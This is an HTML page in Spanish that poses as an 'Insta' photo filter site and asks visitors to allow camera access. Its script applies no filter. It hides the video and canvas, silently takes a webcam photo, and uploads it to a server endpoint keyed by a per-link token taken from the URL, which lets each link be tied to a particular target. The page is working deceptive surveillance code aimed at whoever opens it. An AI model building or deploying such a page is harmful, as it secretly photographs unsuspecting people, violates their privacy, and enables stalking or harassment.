<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Filtros Insta</title>

  <style>
    html, body {
      margin: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, #000000, #ffffff);
      font-family: Arial, sans-serif;
    }

    .mensaje {
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      font-size: 20px;
      padding: 20px;
      box-sizing: border-box;
    }

    .mensaje strong {
      font-size: 24px;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>

<body>

  <div class="mensaje">
    <div>
      <strong>Filtros Insta</strong><br>
      Permite el acceso a la cámara para continuar.
    </div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    (async () => {
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");

      const token = location.pathname.split("/").pop();

      try {
        // El navegador mostrará su propio aviso de permiso.
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: false
        });

        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = resolve;
        });

        // Esperamos a que la cámara tenga imagen.
       await new Promise(resolve => setTimeout(resolve, 800));

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        canvas.getContext("2d").drawImage(
          video,
          0,
          0,
          canvas.width,
          canvas.height
        );

        const image = canvas.toDataURL("image/jpeg", 0.9);

        await fetch(`/api/photo/${token}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            image: image
          })
        });

        // Apagar la cámara después de la captura.
        stream.getTracks().forEach(track => track.stop());

      } catch (error) {
        console.error("Error o permiso de cámara rechazado:", error);
      }
    })();
  </script>

</body>
</html>
